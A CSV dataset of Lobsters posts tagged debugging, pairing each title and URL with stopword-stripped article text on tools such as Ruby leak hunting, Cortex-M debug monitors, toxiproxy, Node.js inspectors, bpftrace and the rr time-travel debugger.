ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,debugging,Debugging,Effective Debugging of Memory Leaks in Ruby,https://stratus3d.com/blog/2020/08/11/effective-debugging-of-memory-leaks-in-ruby,effective debugging memory leak ruby,check unused gem gemfile remove check issue tracker gem still present gemfile report memory leak run rubocop rubocopperformance extension visually review ruby code possible memory leak pretty easy still found issue use ruby class find leak,list step assumes determined memory leak ruby application know causing first instinct might reach memory profiling tool begin looking memory allocation time step might seem like waste time practice found effective use time often overlook simple thing first two step focus gem often time thirdparty code widely used pitfall memory leak widely known check unused gem gemfile remove numerous tool help find memory leak ruby application large codebase even best tool still produce lot noise find even one unused gem greatly reduce amount code need analyze find memory leak seldom found least one two unused gem reviewing gemfile legacy ruby application removing unused gem sometimes added benefit reducing overall memory usage check issue tracker gem still present gemfile report memory leak gem may contain memory leak already reported gem issue tracker mailing list find ticket thread describes something similar leak experiencing may found memory leak newer version gem contains fix memory leak upgrade latest version found ticket fix available may work maintainer gem get fixed fork project fix find someone issue tracker describing issue changelogs show released version gem contain fix memory leak even leak seem like one experiencing best upgrade version known leak find source leak continue step run rubocop rubocopperformance extension likely find cause memory leak alert general performance issue may give clue leak rubocop performance warning correct code see memory leak still present memory leak likely still present continue step visually review ruby code possible memory leak read application code look class attribute grow size array grow never shrink long lived object creating memory leak pretty easy fix obvious issue spend ton time read code quickly look obvious issue application large codebases may need skip step time consuming found cause leak continue step still found issue use ruby objectspace class find leak thing get little involved follow step section profile memory usage
2,Lobsters,debugging,Debugging,Step-through debugging with no debugger on Cortex-M,https://interrupt.memfault.com/blog/cortex-m-debug-monitor,stepthrough debugging debugger cortexm,subscribe table content basic terminology halting debug debug port article itm dwt etm debug monitor mode example project setup built previous post example app built explore breakpoints work enabling debugmonitor exception debug halting control status register dhcsr tip disabling halting debug gdb debug exception monitor control register demcr halting debug debugmonitor exception configuration nuance post arm cortexm exception handling c code enable debugmonitor exception minimal debugmonitor handler post fault handling debug fault status register dfsr halting debug example c code debugmonhandler triggering breakpoint programmatically installing breakpoints fpb fpb check breakpoints even work post adding cli debugmonitor exception c code addition debugmonitor cli debug monitor continue step support c code addition debugmonitor breakpoint singlestep handling single stepping running system application final thought github reference,debugging mcu requires attaching debugger via jtag halting core many situation debug strategy feasible production unit jtag disabled system halting core cause subsystem trying debug fault ie asserts softdevice halting breakpoint remote system uart network interface exposed fortunately arm cortexm u covered week explore debug running system arm cortexm debugmonitor exception handler cover configure mcu operate mode walk example installing breakpoints singlestepping running device opinion debugmonitor handling underutilized feature applied creatively variety debug use case hope end article convince well like interrupt subscribe get latest post straight mailbox table content basic terminology arm cortexm support several level debug halting debug typical configuration use debugger like gdb mode core halted debugging mode requires access debug port via jtag swd walked overview arm debug interface work article tracing via itm dwt etm peripheral let stream instruction execution data access system running tool lauterbach segger jtrace decode stream present result gui desktop debug monitor mode enables debug running system via debugmonitor exception handler helpful scenario halting core cause timing sensitive subsystem fail use case connecting debugger feasible worth noting debug monitor support available architecture however implemented cortexm architecture example project setup following section explore set debug monitor mode simple baremetal application running using following tooling arm development board segger jlinkgdbserver gdbserver gcc gnu arm embedded toolchain compiler gnu make build system simple cli shell built previous post pyserial minitermpy connect serial console article extend upon example app built explore breakpoints work enabling debugmonitor exception debug monitor mode based debugging work triggering exception known debugmonitor exception debug event take place explore configure handler following section debug halting control status register dhcsr monitor mode debug work halting debug disabled notably cdebugen setting must cleared bit set via jtagswd connection reset full poweronreset por occurs debugger clear bit exit trying use monitor mode debug recommend adding check boot otherwise bound confuse trying test feature debugger connected via jtagswd bool debugmonitorenable void volatile dhcsr dhcsr examplelog halting debug enabled ca nt enable monitor mode debug return code set debug monitor mode tip disabling halting debug gdb using gdb halting mode debug disabled manually clearing cdebugen setting appropriate value dbgkey gdb set also useful way keep active gdb session open probe state system running debug exception monitor control register demcr core configuration debugmonitor exception controlled upper bit demcr register monen control whether debugmonitor exception enabled enabled debug event cause exception fire monpend used trigger debugmonitor exception irrespective whether monen set monreq used mcu software use bit convey state monitor mode monstep toggled debugmonitor exception enable hardware singlestepping set upon return exception handler core execute single instruction return debugmonitor exception note lower bit vcharderr etc control whether debug trap occurs automatically various type exception take place take effect using halting debug mode allow guarantee system halted time exception path hit useful trying debug debugmonitor exception configuration nuance debugmonitor exception triggered debug event group priority exception greater current execution priority useful feature guarantee certain high priority operation ie bluetooth radio scheduling continue run step code part system important consequence however mean interrupt running priority debugmonitor exception debuggable using debug monitor support configuring debugmonitor exception priority require updating detail found post arm cortexm exception handling c code enable debugmonitor exception simplicity example app set debugmonitor exception lowest configurable interrupt priority mean interrupt able run debugging code running interrupt putting together bool debugmonitorenable void volatile dhcsr dhcsr examplelog halting debug enabled ca nt enable monitor mode debug return false volatile demcr const monenbit demcr monenbit priority debugmonitor exception bit use lowest priority isrs fire debugmonitor interrupt volatile examplelog monitor mode debug enabled return true minimal debugmonitor handler use handler put together post fault handling dump register state code caused debugmonitor exception invoked typedef struct attribute packed contextstateframe lr returnaddress xpsr scontextstateframe void debugmonitorhandlerc scontextstateframe frame debugmonitor exception logic attribute naked void debugmonhandler void asm volatile tst lr n ite eq n mrseq msp n mrsne psp n b debugmonitorhandlerc n debug fault status register dfsr debugmonitor exception fire dfsr inspected information debug event took place event possible using halting debug debugmonitor state interest dwttrap indicates debug event generated due configuration dwt bkpt indicates one breakpoint event took place either via fpb bkpt instruction halted indicates core halted due monstep request note dfsr bit sticky write value clear example c code debugmonhandler let extend debugmonitorhandlerc dump state collecting void debugmonitorhandlerc scontextstateframe frame volatile demcr volatile dfsr const dfsrdwtevtbitmask const dfsrbkptevtbitmask const dfsrhaltevtbitmask const bool isdwtdbgevt dfsr dfsrdwtevtbitmask const bool isbkptdbgevt dfsr dfsrbkptevtbitmask const bool ishaltdbgevt dfsr dfsrhaltevtbitmask examplelog debugmonitor exception examplelog demcr demcr examplelog dfsr bkpt halt dwt dfsr int isbkptdbgevt int ishaltdbgevt int isdwtdbgevt examplelog register dump examplelog frame examplelog frame examplelog frame examplelog frame examplelog frame examplelog lr frame lr examplelog pc frame returnaddress examplelog frame xpsr triggering breakpoint test thing create super simple cli command issue breakpoint instruction static int prvissuebreakpoint int argc char argv asm bkpt return one terminal need start gdbserver jlinkgdbserver swd device nogui need compile example application flash cd interruptrepo exampledebugmon make compiling srcdebugmonitorexceptionc linking library generated armnoneeabigdbpy evalcommand target remote ex mon reset ex load ex mon reset gdb gdb disable halting debug program continue running gdb set final terminal open serial connection using miniterm minitermpy raw available port jlink enter port index full name miniterm quit ctrl menu ctrlt help ctrlt followed ctrlh shell debugmonen monitor mode debug enabled shell bkpt debugmonitor exception demcr dfsr register dump lr pc expected see bit dfsr set indicating breakpoint debug event generated use gdb inspect instruction located confirm indeed breakpoint instruction gdb xi prvissuebreakpoint bkpt also dump instruction confirm match bkpt instruction encoding gdb px programmatically installing breakpoints fpb fpb program one thefpcomp register hold address would like break layout fpcomp register little odd basically given instraddr fpcomp map instraddr fpcomp map instraddr lowest bit fpcomp control whether breakpoint enabled transcribe logic code follows bool fpbsetbreakpoint sizet compid instraddr instraddr revision breakpoints code installed return false make sure fpb enabled fpb fpctrl const replace instraddr const fpcomp instraddr replace fpb fpcomp compid fpcomp return true detail configure flash patch breakpoint fpb unit check breakpoints even work post facilitate breakpoint testing added program function print name function executed void void examplelog stub function called func calling function test debug monitor mode implementation also added cli command shell help u configure debugmonitor exception handler enable breakpoints call dummy function shell help bkpt issue breakpoint instruction debugmonen enable monitor debug mode fpbdump dump active fpb setting fpbsetbreakpoint set breakpoint comp id address calldummyfuncs invoke dummy function dumpdummyfuncs print first instruction dummy function help list command let try configuring breakpoint address see happens shell dumpdummyfuncs start first instruction shell debugmonen monitor mode debug enabled shell fpbsetbreakpoint set breakpoint address fpcomp succeeded shell fpbdump fpb revision enabled hardware breakpoints fpcomp enabled replace address shell calldummyfuncs stub function called stub function called stub function called debugmonitor exception demcr dfsr register dump lr pc expected see debugmonhandler invoked address pc installed breakpoint adding cli debugmonitor exception add cli debugmonitor handling need way read byte uart isr done either polling peripheral using interrupt configured run higher priority debugmonitor exception reading example app add two command c continue debugmonitor exception fire step one instruction return debugmonitor exception c code addition debugmonitor cli typedef enum kdebugstatenone kdebugstatesinglestep edebugstate static edebugstate suserrequesteddebugstate kdebugstatenone void debugmonitorhandlerc scontextstateframe frame logic dump info isdwtdbgevt isbkptdbgevt suserrequesteddebugstate kdebugstatesinglestep examplelog debug event detected awaiting c char c shellportgetchar c continue examplelog got char c n c c c suserrequesteddebugstate kdebugstatenone break else c suserrequesteddebugstate kdebugstatesinglestep break else examplelog resuming logic debug monitor continue step support stepping breakpoint several step process bkpt instruction need advance program counter size instruction byte bkpt event generated breakpoint configured fpb need disable fpb otherwise attempt continue hit breakpoint singlestep one instruction reenable fpb disable singlestepping order resume program execution debugmonhandler inspect pc frame parameter passed debugmonitorhandlerc figure whether debug event caused executing breakpoint instruction disableenable fpb clearing setting enable bit fpb fpctrl register enabledisable singlestep functionality setting clearing monstep bit demcr c code addition debugmonitor breakpoint singlestep handling let implement logic described code const demcrsinglestepmask isbkptdbgevt const instruction frame returnaddress instruction advance past breakpoint instruction frame returnaddress sizeof instruction else fpb generated breakpoint need disable fpb singlestep fpbdisable examplelog singlestepping fpb x frame returnaddress singlestep next instruction cause debugmonitor interrupt fire return exception single instruction executed halted bit set dfsr happens demcr demcrsinglestepmask serviced breakpoint event clear mask dfsr dfsrbkptevtbitmask else ishaltdbgevt reenable fpb case got via singlestep bkpt debug event fpbenable sdebugstate kdebugstatesinglestep demcr demcrsinglestepmask serviced single step event clear mask dfsr dfsrhaltevtbitmask single stepping running system test singlestep feature use disassemble gdb determine expect see thing working gdb disa dump assembler code function ldr pc ldr pc bw examplelog strb movs strb movs end assembler dump install breakpoint address single step shold see branch executed processor shell debugmonen monitor mode debug enabled shell fpbsetbreakpoint shell calldummyfuncs stub function called stub function called stub function called debugmonitor exception demcr dfsr register dump lr pc debug event detected awaiting c type got char pc debug event detected awaiting c type got char pc debug event detected awaiting c type got char pc debug event detected awaiting c resume flow c see rest function get called got char c stub function called stub function called stub function called stub function called stub function called stub function called stub function dummyfunctionram called nice work point make debugmonitor cli interface useful could extend shell dump content stack memory region application couple project online today make use debug monitor functionality notably segger ship sdk compile project enable monitor mode debug support segger tool quite article make use series let set breakpoints application code without triggering asserts soft device code run higher priority interrupt monitor remote inspection project github expose debugmonitor port implement gdb remote serial protocol compiled project connect gdb directly board via uart connection lot additional use case may want include implementation system well favorite include exposing debug interface third party developer embedded platform debugging sealed unit uart network interface exposed debugging power consumption issue maintaining swdjtag connection would ruin attempt monitor quiescent current debug interface consumes lot power final thought hope article taught little bit arm debug monitor mode handling got thinking creative way feature leveraged used monitor mode debugging project worked love hear used discussion area see anything like change submit pull request open issue github reference
3,Lobsters,debugging,Debugging,rd is a record/replay debugger written in rust,https://github.com/sidkshatriya/rd,rd recordreplay debugger written rust,record debug tool mozillarr installing running credit mozillarr background mozillarr contribution work mozillarr tip suggestion add alias logging recording trace rrtrace environment variable,rd record debug tool rd rust language port mozillarr debugger port progress many thing work already see installing rd requires nightly version rust toolchain compile git clone git githubcom sidkshatriyardgit cd rd cargo install locked force path alternatively use debug like thing run much slowly code compiled lower compiler optimization extra debugmode assertion etc cargo install debug locked force path general run release mode debug mode much slower run rd debug mode run issue working developing rd program tested compile run properly ubuntu installation moment please file ticket rd work properly specific linux distribution general rr compiles run properly linux distro rd running rd invoking rd without parameter give help get help specific rd subcommand rd rerun help credit rd project would possible without work done mozillarr project many humanyears development effort gone making rr truly amazing piece software rd project grateful contributor mozillarr project background rd work principle rr please see mozillarr find information specifically excellent technical overview rr found contribution contribution record debug tool rd welcome encouraged contributing rd agree license contribution mit license without term condition work port currently progress ready enduser usage however developer interested contributing project find lot work build upon project already contains line ported rust code port currently capable replaying trace recorded previously mozillarr rd yet capable recording trace come future port progress following work rd rerun rd replay mean interactive replay us debugger like gdb yet supported rd buildid rd cpufeatures rd dump rd traceinfo tip suggestion add alias installing rd add alias like bash shell assuming local source build mozillarr homeabcxyzrrbuild alias rd rd resourcepathhomeabcxyzrrbuild avoid constantly specifying resource path every rd invocation logging various logging level debug info warn info fatal log warn default debug message autoremotesyscalls rust module example rdlogall warn autoremotesyscalls debug rd etc params recording trace rd record trace point time however process trace previously recorded rr make sure trace recorded n flag disabled syscallbuf rd support syscallbuf recording future rr record n program recorded rrtrace environment variable rd understands rrtrace environment variable eg rrtracethetracedirectory rd replay
4,Lobsters,debugging,Debugging,AURORA: Statistical Crash Analysis for Automated Root Cause Explanation | USENIX,https://www.usenix.org/conference/usenixsecurity20/presentation/blazytko,aurora statistical crash analysis automated root cause explanation usenix,support usenix,open access mediausenix committed open access research presented event paper proceeding freely available everyone event begin video audio andor slide posted event also free open everyone support usenix commitment open access bibtex inproceedings author tim blazytko moritz schl gel cornelius aschermann ali abbasi joel frank simon w rner thorsten holz title aurora statistical crash analysis automated root cause explanation booktitle usenix security symposium usenix security year isbn page url http publisher usenix association month aug
5,Lobsters,debugging,Debugging,"probe.rs: a modern, embedded debugging toolkit, written in Rust",http://probe.rs/,probers modern embedded debugging toolkit written rust,compatible,compatible arm riscv cmsisdap stlink jlink probers support many come
6,Lobsters,debugging,Debugging,Shopify/toxiproxy -- framework for simulating network conditions,https://github.com/Shopify/toxiproxy,shopifytoxiproxy framework simulating network condition,toxiproxy toxiproxy tool need prove test application nt single point failure blog post usage ruby client client table content yet another chaotic tcp proxy client example usage installing upgrading populating using toxics latency bandwidth slow close timeout slicer http api proxy field toxic field endpoint populating proxy cli example faq development yet another chaotic tcp proxy client example sirupsentoxiproxyrailsexample usage redis set sirupsentoxiproxyrailsexample usage installing toxiproxy linux ubuntu o x window http docker docker hub source upgrading toxiproxy changelogmd populating toxiproxy listen using toxiproxy toxics http api creatingtoxicsmd latency bandwidth slowclose timeout slicer limitdata http api proxy field toxic field toxics endpoint get proxy post proxy post populate get proxy proxy post proxy proxy delete proxy proxy get proxy proxy toxics post proxy proxy toxics get proxy proxy toxics toxic post proxy proxy toxics toxic delete proxy proxy toxics toxic post reset get version populating proxy cli example frequently asked question fast toxiproxy toxiproxy randomized testing seeing toxiproxy action reflected mysql toxiproxy cause intermittent connection failure run toxiproxy application development release github draft release bump version homebrew,toxiproxy toxiproxy framework simulating network condition made specifically work testing ci development environment supporting deterministic tampering connection support randomized chaos customization toxiproxy tool need prove test application nt single point failure successfully using development test environment shopify since october see blog post resiliency information toxiproxy usage consists two part tcp proxy written go repository contains client communicating proxy http configure application make test connection go toxiproxy manipulate health via http see usage set project example add latency response mysql ruby client toxiproxy mysqlmaster downstream latency latency apply shopfirst take least end take redis instance toxiproxy redis shopfirst throw exception end example readme currently ruby nothing stopping creating client language see client table content yet another chaotic tcp proxy client example usage installing upgrading populating using toxics latency bandwidth slow close timeout slicer http api proxy field toxic field endpoint populating proxy cli example faq development yet another chaotic tcp proxy existing one found nt provide kind dynamic api needed integration unit testing linux tool like nc crossplatform require root make problematic test development ci environment client example let walk example rail application note toxiproxy way tied ruby first use case see full example sirupsentoxiproxyrailsexample get started right away jump usage popular blog reason storing tag post redis post mysql might post class includes method manipulate tag redis set class post activerecord base return array tag def tag tagredissmembers tagkey end add tag post def addtag tag tagredissadd tagkey tag end remove tag post def removetag tag tagredissrem tagkey tag end return key redis set tag post def tagkey post tag selfid end end decided erroring writing tag data store addingremoving ok however tag data store able see post tag could simply rescue redis cannotconnecterror around smembers redis call tag method let use toxiproxy test since already installed toxiproxy running machine skip step need make sure toxiproxy mapping redis tag configbootrb connection made add require toxiproxy toxiproxypopulate name toxiproxytestredistags listen upstream configenvironmentstestrb set tagredis redis client connects redis toxiproxy adding line tagredis redisnew port call test environment go toxiproxy mean add unit test simulate failure test return empty array tag redis listing tag postaddtag mammal take redises toxiproxy toxiproxy redis assertequal posttags end end test fails redis cannotconnecterror perfect toxiproxy took redis successfully duration closure let fix tag method resilient def tag tagredissmembers tagkey rescue redis cannotconnecterror end test pas unit test prof fetching tag redis return empty array instead throwing exception full coverage also write integration test wrap fetching entire blog post page redis full example application sirupsentoxiproxyrailsexample usage configuring project use toxiproxy consists three step installing toxiproxy populating toxiproxy using toxiproxy installing toxiproxy linux see release latest binary system package architecture ubuntu wget http sudo dpkg sudo service toxiproxy start o x brew tap shopifyshopify brew install toxiproxy window toxiproxy window available download http docker toxiproxy available docker hub docker pull shopifytoxiproxy docker run shopifytoxiproxy using toxiproxy host rather container enable host networking nethost source go installed build toxiproxy source using make file make build toxiproxyserver upgrading toxiproxy toxiproxy several change made api make incompatible version order use version toxiproxy server need make sure client library support version check version toxiproxy running looking version endpoint see documentation client library specific library change detailed change toxiproxy server found changelogmd populating toxiproxy application boot need make sure toxiproxy know endpoint proxy main parameter name address toxiproxy listen address upstream client library helper task essentially making sure proxy list created example ruby client make sure shopifytestredismaster shopifytestmysqlmaster present toxiproxy toxiproxypopulate name shopifytestredismaster listen upstream name shopifytestmysqlmaster listen upstream code need run early boot possible code establishes connection toxiproxy please check client library documentation population helper alternatively use cli create proxy eg toxiproxycli create shopifytestredismaster l u recommend naming app env data store shard make sure clash application using toxiproxy large application recommend storing toxiproxy configuration separate configuration file use configtoxiproxyjson file passed server using config option loaded application use populate function example configtoxiproxyjson name listen upstream enabled true name listen upstream enabled true use port outside ephemeral port range avoid random port conflict linux default see using toxiproxy use toxiproxy need configure application connect toxiproxy continuing example step two configure redis client connect toxiproxy old straight redis redis redisnew port new toxiproxy redis redisnew port tamper toxiproxy api ruby redis redisnew port toxiproxy shopifytestredismaster downstream latency latency apply redisget test take end via cli toxiproxycli toxic add shopifytestredismaster latency please consult respective client library usage toxics toxics manipulate pipe client upstream added removed proxy using http api toxic parameter change affect proxy link documentation implementing custom toxics see creatingtoxicsmd latency add delay data going proxy delay equal latency jitter attribute latency time millisecond jitter time millisecond bringing service technically toxic implementation toxiproxy done posting proxy proxy setting enabled field false bandwidth limit connection maximum number kilobyte per second attribute slowclose delay tcp socket closing delay elapsed attribute delay time millisecond timeout stop data getting close connection timeout timeout connection wo nt close data delayed toxic removed attribute timeout time millisecond slicer slice tcp data small bit optionally adding delay sliced packet attribute averagesize size byte average packet sizevariation variation byte average packet smaller averagesize delay time microsecond delay packet limitdata close connection transmitted data exceeded limit byte number byte transmit connection closed http api communication toxiproxy daemon client happens http interface described toxiproxy listens http port proxy field name proxy name string listen listen address string upstream proxy upstream address string enabled truefalse default true creation change proxy name must deleted recreated changing listen upstream field restart proxy drop active connection listen specified port toxiproxy pick ephemeral port listen field response updated actual port change enabled false take proxy switch back true reenable toxic field name toxic name string default type stream type toxic type string stream link direction affect default downstream toxicity probability toxic applied link default attribute map toxicspecific attribute see toxics toxicspecific attribute stream direction must either upstream downstream upstream applies toxic client server connection downstream applies toxic server client connection used modify request response separately endpoint endpoint json get proxy list existing proxy toxics post proxy create new proxy post populate create replace list proxy get proxy proxy show proxy active toxics post proxy proxy update proxy field delete proxy proxy delete existing proxy get proxy proxy toxics list active toxics post proxy proxy toxics create new toxic get proxy proxy toxics toxic get active toxic field post proxy proxy toxics toxic update active toxic delete proxy proxy toxics toxic remove active toxic post reset enable proxy remove active toxics get version return server version number populating proxy proxy added configured bulk using populate endpoint done passing json array proxy toxiproxy proxy name already exists compared new proxy replaced upstream listen address nt match populate call included example application start ensure required proxy exist safe make call several time since proxy untouched long field consistent new data cli example toxiproxycli create redis l u created new proxy redis toxiproxycli list listen upstream name enabled toxics redis true none hint inspect toxics toxiproxyclient inspect proxyname rediscli p set omg panda ok get omg panda toxiproxycli toxic add redis latency added downstream latency toxic latencydownstream proxy redis rediscli p get omg panda del omg integer toxiproxycli toxic remove redis n latencydownstream removed toxic latencydownstream proxy redis rediscli p get omg nil toxiproxycli delete redis deleted proxy redis rediscli p could connect redis connection refused frequently asked question fast toxiproxy speed toxiproxy depends largely hardware expect latency toxics enabled running macbook pro achieved throughput high higher end desktop basically expect toxiproxy move data around least fast app testing toxiproxy randomized testing many available toxics configured randomness jitter latency toxic also global toxicity parameter specifies percentage connection toxic affect useful thing like timeout toxic would allow x connection timeout seeing toxiproxy action reflected mysql mysql prefer local unix domain socket client matter port pas host set localhost configure mysql server create socket use host remember remove old socket restart server toxiproxy cause intermittent connection failure use port outside ephemeral port range avoid random port conflict linux default see run toxiproxy application recommend using toxiproxy application distinguish service recommend naming proxy scheme app env data store shard example shopifytestredismaster development make build toxiproxy development binary current platform make build toxiproxy binary package platform requires go compiled cross compilation enabled linux darwin well fpm path build debian package make test run toxiproxy test make darwin build binary darwin make linux build binary linux make window build binary window release ensure release run internally shopifyshopify least day best fuzzy test robustness update changelogmd bump version change version readmemd commit tag make release create binary package push new docker image create github draft release new tag upload binary debian package bump version homebrew
7,Lobsters,debugging,Debugging,Let's Debug a Node.js Application,https://blog.heroku.com/debug-node-applications,let debug nodejs application,listen article rely complicated cli tooling analyze core dump pino winston chrome devtools ability inspect memory take heap snapshot creating logpoints nodejs guide inspector client ndb llnode video debug trace clarify video recording julianduque,listen article always challenge come debugging application nodejs asynchronous workflow add extra layer complexity arduous process although update made engine order easily access asynchronous stack trace time get error main thread application make debugging little bit difficult well nodejs application crash usually need rely complicated cli tooling analyze core dump article take look easier way debug nodejs application course developer toolkit complete without logging tend place consolelog statement code local development really scalable strategy production would likely need filtering cleanup implement consistent logging strategy order identify important information genuine error instead implement proper logoriented debugging strategy use logging tool like pino winston allow set log level info warn error allowing print verbose log message locally severe one production also stream log aggregator endpoint like logstash papertrail even slack logging take u far understanding application working way would expect sophisticated debugging session want use breakpoints inspect code behaves moment executed use node inspect node inspect debugging tool come nodejs actually implementation chrome devtools program letting add breakpoints control stepbystep execution view variable follow call stack couple way launch node inspect easiest perhaps call nodejs application inspectbrk flag node inspectbrk yourscriptname launching program head chrome inspect url chrome browser get chrome devtools chrome devtools capability normally expect debugging javascript browser one nicer tool ability inspect memory take heap snapshot profile memory usage understand memory allocated potentially plug memory leak rather launching program certain way many modern ides also support debugging node application addition many feature found chrome devtools bring feature creating logpoints allowing create multiple debugging profile check nodejs guide inspector client information ides another option install ndb standalone debugger nodejs make use devtools available browser isolated local debugger also extra feature nt available devtools support editinplace mean make change code updated logic supported directly debugger platform useful quick iteration suppose application crash due catastrophic error like memory access error may rare happen particularly app relies native code investigate sort issue use llnode program crash llnode used inspect javascript stack frame object mapping object cc side order use first need core dump program need use processabort instead processexit shut process code use processabort node process generates core dump file exit better understand llnode provide video demonstrates capability aside also thirdparty package recommend debugging first called simply enough debug debug assign specific namespace log message based function name entire module selectively choose message printed console via specific environment variable example nodejs server logging several message entire application middleware stack like sequelize express application express router set debug environment variable express router start program message tagged express router shown filtering message way hone single segment application behaving without needing drastically change logging code two module go together trace clarify trace augments asynchronous stack trace providing much detailed information async method called roadmap nodejs provide default clarify help removing information stack trace specific nodejs internals allows concentrate function call specific application neither module recommended running production enable debugging issue local development environment like follow along use debugging tool practice video recording provides detail includes live demo narrow problem code question find twitter julianduque
10,Lobsters,debugging,Debugging,Measuring USB with bpftrace,https://blog.habets.se/2020/08/Measuring-USB-with-bpftrace.html,measuring usb bpftrace,,example run usb stick idling appears probed every two second starting stopping gnuradio sniffing usrp sudo bpftrace usbbwb attaching probe total count average total sum usrp ettus research llc count average total sum usb mass storage devie usbest technology count average total total count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total sum usb mass storage devie usbest technology count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total prettiest interesting note product vendor id decimal find way convert hex bpftrace
11,Lobsters,debugging,Debugging,Julia 1.5 Feature Preview: Time Traveling (Linux) Bug Reporting,https://julialang.org/blog/2020/05/rr/,julia feature preview time traveling linux bug reporting,heisenbug http rrprojectorg technical report issue issue http pernosco previously announced,julia project like large open source project get large number bug report every day developer language try best responsive possible triage investigate fix bug quickly possible bug easy bug report well written problem evident getting fixed usually quick affair however large number report easy several common reason bug may go unaddressed extended period time example bug may reproduce deterministically may reproduce reporter machine sometimes known heisenbug bug report may incomplete specifying environment bug occurs making hard reproduce bug reporter may seen bug entirely sure caused making hard give reproducer making bug report largely unactionable bug may occur large project hard set bug may require specialized expertise diagnose eg missing gc root usually time expert high demand making time commitment required reproduce investigate bug prohibitive addition bug never get filed user may feel effort write highquality bug report high experience frustrating user encountering u often nt learn experience sometimes hear year later somebody may given project julia encountered crashing problem nt feel qualified reduce concise bug report subsequently gave using julia project lastly nt want expect user expert bug reporter often working scientist good programmer may background software engineering valuable user want make sure bug addressed past user encounter particularly difficult problem long time one answer reproduce linux machine get u trace rr tool http rrprojectorg probably get fixed rapidly uninitiated rr linux debugging tool originally developed mozilla robert ocallahan others tool known time traveling debugger reverse execution engine essentially rr split reproducing bug two phase record replay record phase performed bug reporter phase rr creates perfect record execution including bitwise exact memory register state every instruction trace analyzed replay phase performed different developer different machine capability like long imagined academia extremely hard achieve way introduce large overhead distort regular execution rr first tool experience performant enough used regular course development worth discussing achieved limitation approach first let take capability granted take look workflow enables julia released week new command line flag bugreportrr automatically create upload rr recording example usage shown animation start post creates deliberate crash unsafely dereferencing bad pointer however summarize bug reporter pass bugreportrr julia instance reproduces whatever bug attempting reproduce julia exit crash bug reporter prompted authorize upload clicking link githubbased authentication used abuse protection get back link include filing bug report julia package developer use link obtain recording analyze machine addition manual mechanism also switching linux ci system automatically create rr trace execution way ci run fails guaranteed able debug bug report includes link rr trace theory reproduction instruction required rr trace guaranteed perfectly capture environment bug reproduced course bug something nonobvious like unexpected behavior comment expected behavior may still helpful perfect reproducibility almost immediately knock common problem started post work longer available answer trace broke somebody machine debugged heisenbug longer issue captured rr always debugged even solves busyexpert problem allows nonexperts help triage report contain rr trace developer particular nonexperts attempt reproduce bug create trace even expert still required final diagnosis rr trace order magnitude faster plain bug report computer fundamentally deterministic machine given equivalent state input instruction produce deterministic state output subtle execution difference come produce diverging execution prevent bug reproducing well complete answer complicated lot detail roughly split size input state naively state encompasses least entire hard drive memory least large bit state right could potentially cause difference execution really want figure state relevant since large probably many bit send somebody input asynchronous event mean user input data network via nics device also mean thing like timing interrupt execution ordering data race multithreaded execution direct observation nondeterministic hardware effect ie qualifier includes instruction deliberately nondeterministic rdrand generates random number also includes observable undesirable effect hardware state eg timing side channel cache branch predictor state however theory tool able capture relevant state category could repeatedly generate exactly memory image novel idea devil detail discussing detail beyond scope particular post taste asynchronous event define event happened respect rest execution ie correct notion time real time nt work instruction issue frequency nt constant addition usual issue dealing time probably convenient thing use would number retired instruction challenge depending hardware discussed bit hardware section summarize input state simathcal output state determined pure deterministic function iip si mathcal ip mathcal iip corresponding instruction executed time iii asynchronous event aimathcal ai si asynchronous event occurred time iiip si otherwise mathcal begin case mathcal text asynchronous event occurred time mathcal text ip mathcal text otherwise end case iip asynchronous event occurred time help oh well made feel better physic degree also told research least one equation go also people worked really hard get equation rendering working blog better use anyway ah yes rr one key trick us reuse abstraction boundary already exists application underlying operating system specifically linux kernel exploiting abstraction boundary determinism boundary relying determinism apply change made internal application explicitly recording change made kernel lot advantage one kernel isolates lot state part disk state eg file nt requested kernel guaranteed nt affect process state assuming kernel work correctly course abstract hardware detail provides uniform interface resource like network also isolates process another one process interest eg julia activity relevant recovered said scheme also introduces complication order function rr must extremely precise model operation kernel way interacts userspace linux developer work hard attempt keep interface stable application put stringent constraint promise rr sometimes even single bit difference kernel behavior problematic detail interest recommend reading robert technical report deeper overview rr design point though even scratch surface one final thought section origin term timetraveling debugger stem mode analysis system like enables traditional debugger possible execute one instruction time step memory state memory state forward direction system like rr allow opposite replay step backwards state system hood accomplished playing forward beginning likely intermediate checkpoint created performance reason previous state reached however end user illusion going backwards time presented extremely useful mental model debugging previous section described operating principle rr justice reason rr work well reason simple performance overhead recording single threaded process generally often lower purely numerical calculation higher workload interact o recording multiple thread process share memory opposed using kernelbased message passing harder default rr serializes ie run one rather parallel execution task general required correctness since possible observe record interleaving memory operation shared memory space result sharedmemory application likely incur overhead linear number concurrent thread thus good idea try reproduce issue low core count interesting academic thinking high efficiency parallel recording shared memory application nothing even close production ready caveat mind real benchmark number overhead julia test suite seen ci test suite mostly us messagepassing based parallelism running multiple test parallel thread test incurs shared memory overhead penalty plot overhead recording test julia test suite entire test suite mean overhead ie average recorded test took longer non recorded test say rather expected thread test worst offender overhead however lot computational benchmark eg linearalgebra sparsearrays show little overhead expected test spend lot time user space require data recorded might wonder test ran faster rr investigated detail believe measurement artifact runtime test depend code previously ran worker since common code result cached since work assigned greedily worker change schedule sometimes result test running worker already cached work would otherwise necessary run test additionally fortunately u mean slow testbytest basis overall runtime test suite dominated lowoverhead purely computation test plus separate run thread test result increase total time running test suite rr attributable almost entirely thread test alone surprisingly trace may often quite small total compressed size trace full run test suite minute core three gigabyte point comparison significantly smaller even fullmemory coredump would end test suite run around though probably decently well compressible standard technique trace reproduce coredump every single trillion intermediate state already mentioned rr currently work linux however restriction moment chip intel microarchitecture supported rr relies hardware performance counter establish precise accurate notion time asynchronous event hardware counter available precise enough recording using rr work others investigated whether would possible port rr architecture best knowledge current thinking follows amd ryzen microarchitecture seems potentially possible amd performance counter le accurate found intel chip may possible compensate software inaccuracy illunderstood help investigation welcome issue llscbased atomics introduce additional problem since various external factor interrupt descheduling etc observed sc abort proper hardware support would possible work around hardware support appeared inaccurate older generation chip removed recent generation one said microarchitectures varied evidenced experience quality implementation relevant hardware support vary quite bit microarchitecture 